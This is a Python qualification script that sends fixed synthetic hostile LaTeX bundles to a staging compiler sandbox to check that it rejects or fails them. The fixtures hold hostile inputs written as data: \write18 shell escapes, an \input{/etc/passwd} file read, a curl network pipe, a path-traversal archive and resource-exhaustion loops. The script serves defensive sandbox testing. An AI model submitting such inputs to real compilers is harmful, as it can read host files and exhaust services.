"""Run the content-free hostile-input qualification against a staging compiler.

This is deliberately operator-invoked. It sends only fixed synthetic fixtures
and prints case names, outcomes, and elapsed time; no manuscript bytes,
diagnostics, signed envelopes, or credentials are written to stdout or logs.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import time
import uuid
import zipfile
from dataclasses import dataclass
from io import BytesIO

from backend.config import Settings, get_settings
from backend.services.latex_compiler_service import compiler_client_from_settings
from latex_compiler_contract import (
    CompileLimits,
    CompilerEnvelope,
    CompilerJobState,
    CompileSubmission,
    sign_envelope,
)

CONFIRMATION = "QUALIFY_PRIVATE_LATEX_COMPILER_SPACE"
POLL_SECONDS = 0.5


@dataclass(frozen=True)
class QualificationCase:
    name: str
    bundle: bytes
    expected: str


def _zip(files: dict[str, bytes]) -> bytes:
    output = BytesIO()
    with zipfile.ZipFile(output, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for path, content in files.items():
            archive.writestr(path, content)
    return output.getvalue()


def _document(body: str) -> bytes:
    return (
        f"\\documentclass{{article}}\n\\begin{{document}}\n{body}\n\\end{{document}}\n"
    ).encode()


def _path_traversal_archive() -> bytes:
    output = BytesIO()
    with zipfile.ZipFile(output, "w") as archive:
        archive.writestr("../outside.tex", _document("no"))
    return output.getvalue()


def qualification_cases() -> tuple[QualificationCase, ...]:
    """Fixed synthetic cases spanning the compiler trust-boundary threats."""
    disk_line = "x" * 1024
    return (
        QualificationCase(
            "valid-document", _zip({"main.tex": _document("safe")}), "succeeded"
        ),
        QualificationCase(
            "shell-escape",
            _zip({"main.tex": _document("\\immediate\\write18{touch escaped}")}),
            "failed",
        ),
        QualificationCase(
            "host-file-read",
            _zip({"main.tex": _document("\\input{/etc/passwd}")}),
            "failed",
        ),
        QualificationCase(
            "network-pipe",
            _zip({"main.tex": _document('\\input|"curl https://example.invalid"')}),
            "failed",
        ),
        QualificationCase(
            "recursive-expansion",
            _zip({"main.tex": _document("\\def\\looped{\\looped}\\looped")}),
            "failed",
        ),
        QualificationCase(
            "process-pressure",
            _zip({"main.tex": _document("\\immediate\\write18{yes > pressure}")}),
            "failed",
        ),
        QualificationCase(
            "cpu-limit",
            _zip(
                {
                    "main.tex": _document(
                        "\\newcount\\pwcCounter \\pwcCounter=0 "
                        "\\loop \\advance\\pwcCounter by 1 "
                        "\\ifnum\\pwcCounter<1000000000 \\repeat"
                    )
                }
            ),
            "failed",
        ),
        QualificationCase(
            "memory-limit",
            _zip(
                {
                    "main.tex": _document(
                        "\\newcount\\pwcCounter \\pwcCounter=0 "
                        "\\loop \\expandafter\\gdef\\csname pwcMemory"
                        "\\the\\pwcCounter\\endcsname{xxxxxxxxxxxxxxxx} "
                        "\\advance\\pwcCounter by 1 "
                        "\\ifnum\\pwcCounter<10000000 \\repeat"
                    )
                }
            ),
            "failed",
        ),
        QualificationCase(
            "disk-limit",
            _zip(
                {
                    "main.tex": _document(
                        "\\newwrite\\pwcOutput "
                        "\\immediate\\openout\\pwcOutput=pwc-fill.tmp "
                        "\\newcount\\pwcCounter \\pwcCounter=0 "
                        "\\loop \\immediate\\write\\pwcOutput{" + disk_line + "} "
                        "\\advance\\pwcCounter by 1 "
                        "\\ifnum\\pwcCounter<27000 \\repeat"
                    )
                }
            ),
            "failed",
        ),
        QualificationCase(
            "oversized-output",
            _zip(
                {
                    "main.tex": _document(
                        "\\newcount\\n \\n=0 \\loop \\immediate\\write16{output} \\advance\\n by 1 \\ifnum\\n<200000 \\repeat"
                    )
                }
            ),
            "failed",
        ),
        QualificationCase(
            "path-traversal-archive", _path_traversal_archive(), "rejected"
        ),
        QualificationCase("malformed-archive", b"not a zip archive", "rejected"),
        QualificationCase(
            "hostile-pdf",
            _zip(
                {
                    "main.tex": _document("\\includegraphics{figure}"),
                    "figure.pdf": b"%PDF- malformed",
                }
            ),
            "failed",
        ),
    )


def report(results: list[tuple[QualificationCase, str, int]]) -> dict[str, object]:
    rows = [
        {"name": case.name, "outcome": outcome, "elapsed_ms": elapsed_ms}
        for case, outcome, elapsed_ms in results
    ]
    return {
        "cases": rows,
        "passed": sum(case.expected == outcome for case, outcome, _ in results),
        "total": len(rows),
    }


def _submission(case: QualificationCase, settings: Settings) -> CompileSubmission:
    compiler = compiler_client_from_settings(settings)
    envelope = CompilerEnvelope(
        job_id=str(uuid.uuid4()),
        source_digest=hashlib.sha256(case.bundle).hexdigest(),
        source_bytes=len(case.bundle),
        entrypoint="main.tex",
        limits=CompileLimits(),
        expires_at=int(time.time()) + 5 * 60,
    )
    return CompileSubmission(
        envelope=envelope,
        signature=sign_envelope(envelope, compiler.private_key),
        bundle_base64=base64.b64encode(case.bundle).decode("ascii"),
    )


def run_case(case: QualificationCase, settings: Settings) -> tuple[str, int]:
    compiler = compiler_client_from_settings(settings)
    submission = _submission(case, settings)
    started = time.monotonic()
    response = compiler.http_client.post(
        f"{compiler.base_url}/v1/jobs",
        headers=compiler.headers,
        json=submission.model_dump(mode="json"),
    )
    if response.status_code == 422:
        return "rejected", int((time.monotonic() - started) * 1000)
    response.raise_for_status()
    deadline = time.monotonic() + submission.envelope.limits.timeout_seconds + 15
    while time.monotonic() < deadline:
        status = compiler.http_client.get(
            f"{compiler.base_url}/v1/jobs/{submission.envelope.job_id}",
            headers=compiler.headers,
        )
        status.raise_for_status()
        state = status.json().get("state")
        if state in {
            CompilerJobState.SUCCEEDED,
            CompilerJobState.FAILED,
            CompilerJobState.CANCELED,
        }:
            return str(state), int((time.monotonic() - started) * 1000)
        time.sleep(POLL_SECONDS)
    return "timeout", int((time.monotonic() - started) * 1000)


def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--confirm", required=True)
    parser.add_argument("--case", action="append", default=[])
    return parser.parse_args()


def main() -> int:
    args = _parse_args()
    if args.confirm != CONFIRMATION:
        raise SystemExit(f"Pass --confirm {CONFIRMATION}")
    raise SystemExit(
        "Long-lived Docker Space qualification is disabled: use "
        "qualify_latex_compiler_sandbox instead"
    )
    settings = get_settings()
    if settings.environment != "staging":
        raise SystemExit("Qualification requires PWC_ENVIRONMENT=staging")
    if not settings.chat_latex_compiler_jobs_enabled:
        raise SystemExit("Compiler kill switch is enabled; refusing qualification")
    selected = [
        case
        for case in qualification_cases()
        if not args.case or case.name in args.case
    ]
    if not selected or (args.case and len(selected) != len(set(args.case))):
        raise SystemExit("Select one or more known qualification cases")
    try:
        results = [(case, *run_case(case, settings)) for case in selected]
    except RuntimeError as error:
        raise SystemExit(str(error)) from error
    payload = report(results)
    print(json.dumps(payload, sort_keys=True))
    return 0 if payload["passed"] == payload["total"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
